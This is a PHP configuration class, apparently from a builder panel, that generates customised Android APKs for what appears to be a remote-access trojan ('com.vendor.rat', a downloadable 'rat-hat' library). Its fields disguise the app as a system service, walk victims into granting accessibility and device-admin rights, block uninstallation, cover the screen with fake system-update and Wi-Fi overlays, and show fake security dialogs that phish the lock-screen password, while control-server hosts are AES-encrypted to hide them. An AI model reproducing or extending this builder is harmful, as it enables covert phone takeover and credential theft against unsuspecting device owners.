<?php

declare(strict_types=1);

namespace App\Services\GradleApkBuilder;

use Illuminate\Contracts\Support\Arrayable;

/**
 * Gradle APK 构建配置 DTO
 *
 * 每个字段最终会写入 Android 项目的某个配置文件中:
 *
 * | 目标文件                     | 字段                                              |
 * |-----------------------------|----------------------------------------------------|
 * | app/build.gradle            | applicationId, versionCode, versionName            |
 * | res/values/strings.xml      | appName, accessibilityServiceLabel                 |
 * | assets/config.json (加密)   | serverHost, downloadRatHatHost, guideAccessibility |
 * | assets/config.json (明文)   | 其余所有字段                                        |
 * | res/drawable/               | iconPath (本地图片替换)                              |
 * | assets/default_bg.png       | backgroundPath (本地图片替换)                        |
 *
 * 加密说明:
 *   serverHost, downloadRatHatHost, guideAccessibilityHost 使用 AES-128-ECB 加密后
 *   以 Base64 编码写入 config.json，Android 端由 ConfigDecryptor.java 解密。
 *   其余字段以明文写入。
 */
final class GradleApkBuildConfig implements Arrayable
{
    public function __construct(
        // =====================================================================
        // 必填字段
        // =====================================================================

        /**
         * 应用显示名称
         *
         * 写入 → res/values/strings.xml 的 app_name
         * 用途: 设备桌面图标下方显示的名称、系统设置中的应用名
         * 示例: '系统服务', 'WiFi Manager', '安全中心'
         * 限制: 不超过 100 个字符
         */
        public string $appName,

        /**
         * WebSocket 服务端地址
         *
         * 写入 → config.json webSocketUrl (明文)
         * 用途: Android 客户端与控制平台的实时通信连接
         * 格式: ws://host:port/path 或 wss://host:port/path
         * 示例: 'ws://192.168.31.35:8081', 'wss://api.example.com/bridge'
         */
        public string $websocketUrl,

        /**
         * 用户邮箱 (设备归属标识)
         *
         * 写入 → config.json userEmail (明文，含 @ 符号时不加密)
         * 用途: 标识该 APK 属于哪个管理员用户，设备上线时携带此信息
         * 格式: 标准邮箱地址
         * 示例: 'admin@example.com', 'demo@qq.com'
         */
        public string $userEmail,

        // =====================================================================
        // 包名与版本 → build.gradle
        // =====================================================================

        /**
         * Android 应用包名 (Application ID)
         *
         * 写入 → build.gradle applicationId
         * 用途: APK 安装到设备后的唯一标识，系统用此区分不同应用
         * 格式: 合法的 Java 包名 (如 com.example.app)
         * 默认: 空字符串 = 保持源码默认值 'com.vendor.rat'
         * 注意: 只修改 applicationId，不修改 namespace (Java 源码包名不变)
         *       同一设备上不同 applicationId 可共存安装
         * 示例: 'com.system.service', 'com.wifi.manager'
         */
        public string $applicationId = 'com.vendor.rat',

        /**
         * 版本号 (用户可见)
         *
         * 写入 → build.gradle versionName
         * 用途: 设置 > 应用详情中显示的版本号
         * 格式: 语义化版本 x.y 或 x.y.z
         * 示例: '1.0.0', '2.1', '3.0.0'
         */
        public string $versionName = '1.0.0',

        /**
         * 版本代码 (系统内部)
         *
         * 写入 → build.gradle versionCode
         * 用途: 系统判断版本升降级的整数值，每次发布需递增
         * 限制: 必须 >= 1
         * 示例: 1, 2, 100
         */
        public int $versionCode = 1,

        // =====================================================================
        // 服务端配置 → config.json (AES-128-ECB 加密后写入)
        // =====================================================================

        /**
         * 主 API 服务器地址
         *
         * 写入 → config.json serverHost (AES 加密)
         * 用途: Android 客户端的 HTTP API 通信服务器
         * 留空: 不写入 config.json (客户端使用 AppConfig 默认值)
         * 示例: 'https://api.example.com'
         */
        public string $serverHost = '',

        /**
         * RatHat 库下载服务器地址
         *
         * 写入 → config.json downloadRatHatHost (AES 加密)
         * 用途: 客户端下载 rat-hat 动态库的服务器
         * 留空: 不写入 config.json
         * 示例: 'https://rathat.me/lib'
         */
        public string $downloadRatHatHost = '',

        /**
         * 无障碍引导页服务器地址
         *
         * 写入 → config.json guideAccessibilityHost (AES 加密)
         * 用途: 引导用户开启无障碍服务的 WebView 页面地址
         * 留空: 不写入 config.json (客户端使用默认引导页)
         * 示例: 'https://guide.accessibility.example.com'
         */
        public string $guideAccessibilityHost = '',

        /**
         * 设备认证密钥
         *
         * 写入 → config.json deviceAuthSecret (明文)
         * 用途: 设备首次上线时与服务端握手认证的密钥
         * 注意: 生产环境务必修改默认值
         */
        public string $deviceAuthSecret = 'dev-secret-change-in-production',

        /**
         * 心跳间隔 (秒)
         *
         * 写入 → config.json heartbeatInterval
         * 用途: WebSocket 连接的心跳包发送频率
         * 默认: 10 秒
         * 范围: 建议 5-60 秒
         */
        public int $heartbeatInterval = 10,

        // =====================================================================
        // 功能配置 → config.json (明文)
        // =====================================================================

        /**
         * RatHat 库文件名
         *
         * 写入 → config.json downloadRatHatName
         * 用途: 从 downloadRatHatHost 下载的文件名
         */
        public string $downloadRatHatName = 'rat-hat',

        /**
         * WebView 主页 URL
         *
         * 写入 → config.json mainUrl
         * 用途: 无障碍开启后 WebView 加载的主页面
         * 示例: 'https://m.baidu.com/', 'https://www.google.com/'
         */
        public string $mainUrl = 'https://m.baidu.com/',

        /**
         * 遮罩弹窗图标 URL
         *
         * 写入 → config.json blockIconUrl
         * 用途: 遮罩期间显示的图标 (如系统更新、WiFi 初始化界面)
         * 格式: HTTP URL 指向 PNG 图片
         */
        public string $blockIconUrl = '',

        /**
         * 遮罩弹窗背景色
         *
         * 写入 → config.json blockBgColor
         * 用途: 遮罩 Activity 的背景颜色
         * 格式: 6 位 HEX 颜色值
         * 默认: '#303133' (深灰色)
         */
        public string $blockBgColor = '#303133',

        /**
         * 委托管理员 ID
         *
         * 写入 → config.json trusteeId
         * 用途: 指定该设备的受托管理员 (多级代理场景)
         */
        public string $trusteeId = '',

        /**
         * 主 Activity 类名
         *
         * 写入 → config.json mainActivity
         * 用途: 指定启动 Activity (高级配置，一般留空)
         */
        public string $mainActivity = '',

        /**
         * 推广模式
         *
         * 写入 → config.json promotionModel
         * 用途: 控制应用的推广/伪装行为
         * 值: 1 = 启用, 0 = 禁用
         */
        public int $promotionModel = 1,

        /**
         * 防卸载保护
         *
         * 写入 → config.json uninstall
         * 用途: 是否开启卸载保护 (设备管理员模式)
         * 值: 0 = 保护 (不可卸载), 1 = 允许卸载
         */
        public int $uninstall = 0,

        /**
         * 设备管理员
         *
         * 写入 → config.json activeAdmin
         * 用途: 是否请求激活设备管理员权限
         * 值: 1 = 请求激活, 0 = 不请求
         */
        public int $activeAdmin = 1,

        /**
         * 调试模式
         *
         * 写入 → config.json debug
         * 用途: 是否开启调试日志和详细错误信息
         * 值: 1 = 调试模式, 0 = 生产模式
         * 注意: 生产环境建议设为 0
         */
        public int $debug = 1,

        /**
         * 息屏时长 (秒)
         *
         * 写入 → config.json perScreenOffDuration
         * 用途: 每次息屏操作的持续时间
         * 默认: 2 秒
         */
        public int $perScreenOffDuration = 2,

        /**
         * 空闲时长 (秒)
         *
         * 写入 → config.json perIdleDuration
         * 用途: 操作间的空闲等待时间
         * 默认: 5 秒
         */
        public int $perIdleDuration = 5,

        // =====================================================================
        // UI 文本配置 → config.json (明文)
        // 支持多语言: 构建时根据目标语言传入对应文本
        // =====================================================================

        /**
         * 无障碍引导弹窗标题
         *
         * 写入 → config.json alertTitle
         * 用途: 引导用户开启无障碍服务的弹窗标题
         * 占位符: [无障碍服务] 会被替换为 accessibilityServiceLabel 的值
         */
        public string $alertTitle = '开启 [无障碍服务]',

        /**
         * 无障碍引导弹窗说明文本
         *
         * 写入 → config.json alertMsg
         * 用途: 引导用户开启无障碍服务的步骤说明
         * 支持: \n 换行符
         */
        public string $alertMsg = "1.点击「立即前往」进入无障碍服务页面\n2.下拉到底部，找到「已下载的应用」，点击进入\n3.找到 [无障碍服务]，点击进入\n4.点击右上角的开关，即可开启 [无障碍服务]",

        /**
         * 引导弹窗确认按钮文本
         *
         * 写入 → config.json okText
         * 用途: 跳转到无障碍设置的按钮文字
         */
        public string $okText = '立即前往',

        /**
         * 退出确认提示
         *
         * 写入 → config.json exitConfirm
         * 用途: 用户按返回键时的 Toast 提示 (双击退出)
         */
        public string $exitConfirm = '再按一次退出',

        /**
         * 允许受限设置按钮文本
         *
         * 写入 → config.json allowRestricted
         * 用途: Android 13+ 无障碍受限设置时显示的按钮
         */
        public string $allowRestricted = '允许受限设置',

        /**
         * 受限设置说明文本
         *
         * 写入 → config.json alertRestrictedMsg
         * 用途: 无障碍受限时的详细说明 (留空使用默认)
         */
        public string $alertRestrictedMsg = '',

        /**
         * 应用标签 (config.json 级别)
         *
         * 写入 → config.json appLabel
         * 用途: 客户端内部引用的应用标签，用于遮罩界面等
         * 注意: 与 appName (strings.xml) 不同，此字段由 config.json 控制
         */
        public string $appLabel = '系统服务',

        /**
         * 无障碍服务标签
         *
         * 写入 → config.json accessibilityServiceLabel + strings.xml accessibility_service_description
         * 用途: 系统设置 > 无障碍中显示的服务名称
         */
        public string $accessibilityServiceLabel = '系统服务',

        /**
         * 启动器标签
         *
         * 写入 → config.json launcherLabel
         * 用途: 桌面启动器中显示的名称 (可与 appName 不同)
         */
        public string $launcherLabel = '系统服务',

        /**
         * 保活遮罩提示文本
         *
         * 写入 → config.json aliveBlockMsg
         * 用途: 保活遮罩界面 (仿待机省电) 显示的标题
         */
        public string $aliveBlockMsg = '待机省电模式',

        /**
         * 系统更新遮罩文本
         *
         * 写入 → config.json updateSystemMsg
         * 用途: 伪装系统更新时的全屏遮罩提示
         * 支持: \n 换行符
         */
        public string $updateSystemMsg = "系统正在修复中\n请勿操作手机...",

        /**
         * WiFi 初始化遮罩文本
         *
         * 写入 → config.json wifiBlockMsg
         * 用途: 伪装 WiFi 初始化时的全屏遮罩提示
         * 支持: \n 换行符
         */
        public string $wifiBlockMsg = "正在初始化Wi-Fi网络数据传输密钥\n请勿操作手机...",

        /**
         * 前台通知标题
         *
         * 写入 → config.json notificationTitle
         * 用途: 保活前台服务的通知栏标题
         */
        public string $notificationTitle = '待机省电模式',

        /**
         * 前台通知内容
         *
         * 写入 → config.json notificationContent
         * 用途: 保活前台服务的通知栏内容文字
         */
        public string $notificationContent = '已进入待机省电模式，点击此处唤醒',

        /**
         * 凭证验证弹窗标题
         *
         * 写入 → config.json appCredentialTitle
         * 用途: 请求用户输入锁屏密码时的弹窗标题
         */
        public string $appCredentialTitle = '验证个人身份',

        /**
         * 凭证验证弹窗副标题
         *
         * 写入 → config.json appCredentialSubTitle
         */
        public string $appCredentialSubTitle = '隐私保护',

        /**
         * 凭证验证弹窗描述
         *
         * 写入 → config.json appCredentialDescription
         * 用途: 解释为什么需要验证锁屏密码
         */
        public string $appCredentialDescription = '为保护您的隐私，请输入锁屏密码以验证是否为本人操作。',

        /**
         * 凭证初始化等待提示
         *
         * 写入 → config.json appCredentialInitMsg
         * 用途: 凭证验证初始化时的加载提示
         */
        public string $appCredentialInitMsg = "正在初始化验证密钥\n请稍候...",

        /**
         * 系统更新凭证验证标题
         *
         * 写入 → config.json updateCredentialTitle
         * 用途: 伪装系统安全更新时请求锁屏密码的标题
         */
        public string $updateCredentialTitle = '修复系统安全漏洞',

        /**
         * 系统更新凭证验证副标题
         *
         * 写入 → config.json updateCredentialSubTitle
         */
        public string $updateCredentialSubTitle = '验证锁屏密码',

        /**
         * 系统更新凭证验证描述
         *
         * 写入 → config.json updateCredentialDescription
         */
        public string $updateCredentialDescription = '请输入锁屏密码以完成系统更新并修复安全漏洞。',

        // =====================================================================
        // 引导弹窗资源 → config.json (明文)
        // =====================================================================

        /**
         * 引导弹窗背景图 URL
         *
         * 写入 → config.json guideDialogBgUrl
         * 加载策略 (Android 端 GuideDialogHelper):
         *   - 空字符串 → 加载 assets/default_bg.png
         *   - 本地路径 (不以 http 开头) → BitmapFactory.decodeFile 直接加载
         *   - HTTP/HTTPS URL → 异步下载后显示
         */
        public string $guideDialogBgUrl = '',

        /**
         * 引导弹窗图标 URL
         *
         * 写入 → config.json guideDialogIcoUrl
         * 加载策略: 同 guideDialogBgUrl (空=assets/default_ico.png)
         */
        public string $guideDialogIcoUrl = '',

        /**
         * 是否启用 WebView 引导页
         *
         * 写入 → config.json enableGuideWebView
         * 用途: true = 引导页使用 WebView 加载远程页面, false = 使用本地弹窗
         * 注意: 需要 guideAccessibilityHost 配合使用
         * 默认: false (使用本地 GuideDialogHelper 弹窗)
         */
        public bool $enableGuideWebView = false,

        // =====================================================================
        // 构建资源文件 (不写入 config.json，由构建器处理)
        // =====================================================================

        /**
         * 自定义应用图标路径
         *
         * 构建时操作: 复制到 res/drawable/ 替换默认矢量图标
         * 格式: 服务器上的文件绝对路径 (PNG 格式)
         * 留空: 保持默认蓝底白色加号图标
         * 示例: '/var/www/storage/app/public/icons/custom_icon.png'
         */
        public string $iconPath = '',

        /**
         * 自定义引导弹窗背景图路径
         *
         * 构建时操作: 复制到 assets/default_bg.png 替换内置默认背景
         * 格式: 服务器上的文件绝对路径 (PNG 格式)
         * 留空: 保持 assets 中的默认背景图
         * 区别: 此字段在构建时替换内置资源，guideDialogBgUrl 是运行时加载
         * 示例: '/var/www/storage/app/public/backgrounds/d1.png'
         */
        public string $backgroundPath = '',
    ) {}

    public static function fromArray(array $data): self
    {
        return new self(
            appName: $data['app_name'] ?? $data['appName'] ?? '',
            websocketUrl: $data['websocket_url'] ?? $data['websocketUrl'] ?? '',
            userEmail: $data['user_email'] ?? $data['userEmail'] ?? '',

            applicationId: $data['application_id'] ?? $data['applicationId'] ?? 'com.vendor.rat',
            versionName: $data['version_name'] ?? $data['versionName'] ?? '1.0.0',
            versionCode: (int) ($data['version_code'] ?? $data['versionCode'] ?? 1),

            serverHost: $data['server_host'] ?? $data['serverHost'] ?? '',
            downloadRatHatHost: $data['download_rat_hat_host'] ?? $data['downloadRatHatHost'] ?? '',
            guideAccessibilityHost: $data['guide_accessibility_host'] ?? $data['guideAccessibilityHost'] ?? '',
            deviceAuthSecret: $data['device_auth_secret'] ?? $data['deviceAuthSecret'] ?? 'dev-secret-change-in-production',
            heartbeatInterval: (int) ($data['heartbeat_interval'] ?? $data['heartbeatInterval'] ?? 10),

            downloadRatHatName: $data['download_rat_hat_name'] ?? $data['downloadRatHatName'] ?? 'rat-hat',
            mainUrl: $data['main_url'] ?? $data['mainUrl'] ?? 'https://m.baidu.com/',
            blockIconUrl: $data['block_icon_url'] ?? $data['blockIconUrl'] ?? '',
            blockBgColor: $data['block_bg_color'] ?? $data['blockBgColor'] ?? '#303133',
            trusteeId: $data['trustee_id'] ?? $data['trusteeId'] ?? '',
            mainActivity: $data['main_activity'] ?? $data['mainActivity'] ?? '',
            promotionModel: (int) ($data['promotion_model'] ?? $data['promotionModel'] ?? 1),
            uninstall: (int) ($data['uninstall'] ?? 0),
            activeAdmin: (int) ($data['active_admin'] ?? $data['activeAdmin'] ?? 1),
            debug: (int) ($data['debug'] ?? 1),
            perScreenOffDuration: (int) ($data['per_screen_off_duration'] ?? $data['perScreenOffDuration'] ?? 2),
            perIdleDuration: (int) ($data['per_idle_duration'] ?? $data['perIdleDuration'] ?? 5),

            alertTitle: $data['alert_title'] ?? $data['alertTitle'] ?? '开启 [无障碍服务]',
            alertMsg: $data['alert_msg'] ?? $data['alertMsg'] ?? "1.点击「立即前往」进入无障碍服务页面\n2.下拉到底部，找到「已下载的应用」，点击进入\n3.找到 [无障碍服务]，点击进入\n4.点击右上角的开关，即可开启 [无障碍服务]",
            okText: $data['ok_text'] ?? $data['okText'] ?? '立即前往',
            exitConfirm: $data['exit_confirm'] ?? $data['exitConfirm'] ?? '再按一次退出',
            allowRestricted: $data['allow_restricted'] ?? $data['allowRestricted'] ?? '允许受限设置',
            alertRestrictedMsg: $data['alert_restricted_msg'] ?? $data['alertRestrictedMsg'] ?? '',
            appLabel: $data['app_label'] ?? $data['appLabel'] ?? '系统服务',
            accessibilityServiceLabel: $data['accessibility_service_label'] ?? $data['accessibilityServiceLabel'] ?? '系统服务',
            launcherLabel: $data['launcher_label'] ?? $data['launcherLabel'] ?? '系统服务',
            aliveBlockMsg: $data['alive_block_msg'] ?? $data['aliveBlockMsg'] ?? '待机省电模式',
            updateSystemMsg: $data['update_system_msg'] ?? $data['updateSystemMsg'] ?? "系统正在修复中\n请勿操作手机...",
            wifiBlockMsg: $data['wifi_block_msg'] ?? $data['wifiBlockMsg'] ?? "正在初始化Wi-Fi网络数据传输密钥\n请勿操作手机...",
            notificationTitle: $data['notification_title'] ?? $data['notificationTitle'] ?? '待机省电模式',
            notificationContent: $data['notification_content'] ?? $data['notificationContent'] ?? '已进入待机省电模式，点击此处唤醒',
            appCredentialTitle: $data['app_credential_title'] ?? $data['appCredentialTitle'] ?? '验证个人身份',
            appCredentialSubTitle: $data['app_credential_sub_title'] ?? $data['appCredentialSubTitle'] ?? '隐私保护',
            appCredentialDescription: $data['app_credential_description'] ?? $data['appCredentialDescription'] ?? '为保护您的隐私，请输入锁屏密码以验证是否为本人操作。',
            appCredentialInitMsg: $data['app_credential_init_msg'] ?? $data['appCredentialInitMsg'] ?? "正在初始化验证密钥\n请稍候...",
            updateCredentialTitle: $data['update_credential_title'] ?? $data['updateCredentialTitle'] ?? '修复系统安全漏洞',
            updateCredentialSubTitle: $data['update_credential_sub_title'] ?? $data['updateCredentialSubTitle'] ?? '验证锁屏密码',
            updateCredentialDescription: $data['update_credential_description'] ?? $data['updateCredentialDescription'] ?? '请输入锁屏密码以完成系统更新并修复安全漏洞。',

            guideDialogBgUrl: $data['guide_dialog_bg_url'] ?? $data['guideDialogBgUrl'] ?? '',
            guideDialogIcoUrl: $data['guide_dialog_ico_url'] ?? $data['guideDialogIcoUrl'] ?? '',
            enableGuideWebView: (bool) ($data['enable_guide_web_view'] ?? $data['enableGuideWebView'] ?? false),

            iconPath: $data['icon_path'] ?? $data['iconPath'] ?? '',
            backgroundPath: $data['background_path'] ?? $data['backgroundPath'] ?? '',
        );
    }

    public function validate(): array
    {
        $errors = [];

        if (empty($this->appName)) {
            $errors[] = 'app_name is required';
        } elseif (mb_strlen($this->appName) > 100) {
            $errors[] = 'app_name must not exceed 100 characters';
        }

        if (empty($this->websocketUrl)) {
            $errors[] = 'websocket_url is required';
        } elseif (! preg_match('/^wss?:\/\/.+/', $this->websocketUrl)) {
            $errors[] = 'websocket_url must start with ws:// or wss://';
        }

        if (empty($this->userEmail)) {
            $errors[] = 'user_email is required';
        } elseif (! filter_var($this->userEmail, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'user_email must be a valid email address';
        }

        if (! empty($this->applicationId) && ! preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->applicationId)) {
            $errors[] = 'application_id must be a valid package name (e.g., com.example.app)';
        }

        if (! preg_match('/^\d+(\.\d+){0,2}$/', $this->versionName)) {
            $errors[] = 'version_name must be a valid version (e.g., 1.0 or 1.0.0)';
        }

        if ($this->versionCode < 1) {
            $errors[] = 'version_code must be a positive integer';
        }

        if (! empty($this->iconPath) && ! file_exists($this->iconPath)) {
            $errors[] = "icon_path does not exist: {$this->iconPath}";
        }

        if (! empty($this->backgroundPath) && ! file_exists($this->backgroundPath)) {
            $errors[] = "background_path does not exist: {$this->backgroundPath}";
        }

        return $errors;
    }

    public function isValid(): bool
    {
        return empty($this->validate());
    }

    /**
     * 生成 config.json 内容
     *
     * 将配置字段序列化为 Android 端 assets/config.json 的格式。
     * 加密字段 (serverHost, downloadRatHatHost, guideAccessibilityHost) 非空时
     * 使用 AES-128-ECB 加密后以 Base64 编码写入。
     *
     * @param  string  $aesKey  AES-128-ECB 密钥 (16 字节，与 Android ConfigDecryptor.java 一致)
     * @return array<string, mixed> config.json 内容 (可直接 json_encode)
     */
    public function toConfigJson(string $aesKey): array
    {
        $config = [];

        // 加密字段: 非空时 AES 加密后写入
        if (! empty($this->serverHost)) {
            $config['serverHost'] = self::aesEncrypt($this->serverHost, $aesKey);
        }
        if (! empty($this->downloadRatHatHost)) {
            $config['downloadRatHatHost'] = self::aesEncrypt($this->downloadRatHatHost, $aesKey);
        }
        if (! empty($this->guideAccessibilityHost)) {
            $config['guideAccessibilityHost'] = self::aesEncrypt($this->guideAccessibilityHost, $aesKey);
        }

        // webSocketUrl: ws/wss 开头直接写入 (Android 端按协议前缀判断是否加密)
        $config['webSocketUrl'] = $this->websocketUrl;

        // userEmail: 含 @ 直接写入 (Android 端按 @ 判断是否加密)
        $config['userEmail'] = $this->userEmail;

        // 直接写入字段
        $config['deviceAuthSecret'] = $this->deviceAuthSecret;
        $config['heartbeatInterval'] = $this->heartbeatInterval;
        $config['downloadRatHatName'] = $this->downloadRatHatName;
        $config['mainUrl'] = $this->mainUrl;
        $config['blockIconUrl'] = $this->blockIconUrl;
        $config['blockBgColor'] = $this->blockBgColor;
        $config['trusteeId'] = $this->trusteeId;
        $config['mainActivity'] = $this->mainActivity;
        $config['promotionModel'] = $this->promotionModel;
        $config['uninstall'] = $this->uninstall;
        $config['activeAdmin'] = $this->activeAdmin;
        $config['debug'] = $this->debug;
        $config['perScreenOffDuration'] = $this->perScreenOffDuration;
        $config['perIdleDuration'] = $this->perIdleDuration;

        // UI 文本
        $config['alertTitle'] = $this->alertTitle;
        $config['alertMsg'] = $this->alertMsg;
        $config['okText'] = $this->okText;
        $config['exitConfirm'] = $this->exitConfirm;
        $config['allowRestricted'] = $this->allowRestricted;
        $config['alertRestrictedMsg'] = $this->alertRestrictedMsg;
        $config['appLabel'] = $this->appLabel;
        $config['accessibilityServiceLabel'] = $this->accessibilityServiceLabel;
        $config['launcherLabel'] = $this->launcherLabel;
        $config['aliveBlockMsg'] = $this->aliveBlockMsg;
        $config['updateSystemMsg'] = $this->updateSystemMsg;
        $config['wifiBlockMsg'] = $this->wifiBlockMsg;
        $config['notificationTitle'] = $this->notificationTitle;
        $config['notificationContent'] = $this->notificationContent;
        $config['appCredentialTitle'] = $this->appCredentialTitle;
        $config['appCredentialSubTitle'] = $this->appCredentialSubTitle;
        $config['appCredentialDescription'] = $this->appCredentialDescription;
        $config['appCredentialInitMsg'] = $this->appCredentialInitMsg;
        $config['updateCredentialTitle'] = $this->updateCredentialTitle;
        $config['updateCredentialSubTitle'] = $this->updateCredentialSubTitle;
        $config['updateCredentialDescription'] = $this->updateCredentialDescription;

        // 引导弹窗
        $config['guideDialogBgUrl'] = $this->guideDialogBgUrl;
        $config['guideDialogIcoUrl'] = $this->guideDialogIcoUrl;
        $config['enableGuideWebView'] = $this->enableGuideWebView;

        return $config;
    }

    public function toArray(): array
    {
        return [
            'app_name' => $this->appName,
            'websocket_url' => $this->websocketUrl,
            'user_email' => $this->userEmail,
            'application_id' => $this->applicationId,
            'version_name' => $this->versionName,
            'version_code' => $this->versionCode,
            'server_host' => $this->serverHost,
            'download_rat_hat_host' => $this->downloadRatHatHost,
            'guide_accessibility_host' => $this->guideAccessibilityHost,
            'device_auth_secret' => $this->deviceAuthSecret,
            'heartbeat_interval' => $this->heartbeatInterval,
            'download_rat_hat_name' => $this->downloadRatHatName,
            'main_url' => $this->mainUrl,
            'block_icon_url' => $this->blockIconUrl,
            'block_bg_color' => $this->blockBgColor,
            'trustee_id' => $this->trusteeId,
            'main_activity' => $this->mainActivity,
            'promotion_model' => $this->promotionModel,
            'uninstall' => $this->uninstall,
            'active_admin' => $this->activeAdmin,
            'debug' => $this->debug,
            'per_screen_off_duration' => $this->perScreenOffDuration,
            'per_idle_duration' => $this->perIdleDuration,
            'alert_title' => $this->alertTitle,
            'alert_msg' => $this->alertMsg,
            'ok_text' => $this->okText,
            'exit_confirm' => $this->exitConfirm,
            'allow_restricted' => $this->allowRestricted,
            'alert_restricted_msg' => $this->alertRestrictedMsg,
            'app_label' => $this->appLabel,
            'accessibility_service_label' => $this->accessibilityServiceLabel,
            'launcher_label' => $this->launcherLabel,
            'alive_block_msg' => $this->aliveBlockMsg,
            'update_system_msg' => $this->updateSystemMsg,
            'wifi_block_msg' => $this->wifiBlockMsg,
            'notification_title' => $this->notificationTitle,
            'notification_content' => $this->notificationContent,
            'app_credential_title' => $this->appCredentialTitle,
            'app_credential_sub_title' => $this->appCredentialSubTitle,
            'app_credential_description' => $this->appCredentialDescription,
            'app_credential_init_msg' => $this->appCredentialInitMsg,
            'update_credential_title' => $this->updateCredentialTitle,
            'update_credential_sub_title' => $this->updateCredentialSubTitle,
            'update_credential_description' => $this->updateCredentialDescription,
            'guide_dialog_bg_url' => $this->guideDialogBgUrl,
            'guide_dialog_ico_url' => $this->guideDialogIcoUrl,
            'enable_guide_web_view' => $this->enableGuideWebView,
            'icon_path' => $this->iconPath,
            'background_path' => $this->backgroundPath,
        ];
    }

    /**
     * AES-128-ECB 加密
     *
     * 与 Android 端 ConfigDecryptor.java 使用相同的加密参数:
     *   - 算法: AES / ECB / PKCS5Padding (PHP 中等价于 PKCS7)
     *   - 密钥: 16 字节 (AES-128)
     *   - 编码: 标准 Base64 (Android 端先尝试 DEFAULT 再尝试 URL_SAFE)
     *
     * @param  string  $plainText  待加密的明文
     * @param  string  $key  16 字节 AES 密钥
     * @return string Base64 编码的密文
     */
    public static function aesEncrypt(string $plainText, string $key): string
    {
        $encrypted = openssl_encrypt($plainText, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);

        if ($encrypted === false) {
            throw new \RuntimeException('AES encryption failed: ' . openssl_error_string());
        }

        return base64_encode($encrypted);
    }
}
